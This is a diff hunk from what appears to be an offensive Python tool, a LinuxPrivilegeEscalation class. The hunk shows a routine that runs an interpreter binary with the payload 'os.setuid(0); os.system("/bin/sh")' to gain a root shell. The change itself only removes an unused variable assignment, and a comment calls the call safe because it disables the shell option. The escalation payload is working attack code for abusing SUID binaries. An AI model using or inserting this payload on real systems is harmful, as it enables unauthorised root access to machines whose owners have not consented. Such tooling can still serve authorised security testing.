@@ -208,7 +208,7 @@ class LinuxPrivilegeEscalation(BasePrivilegeEscalation):
             python_code = 'import os; os.setuid(0); os.system("/bin/sh")'
             cmd_list = [binary, "-c", python_code]
             try:
-                result = subprocess.run(
+                subprocess.run(
                     cmd_list, shell=False, capture_output=True, timeout=10  # 安全: 禁用 shell
                 )
                 return EscalationResult(
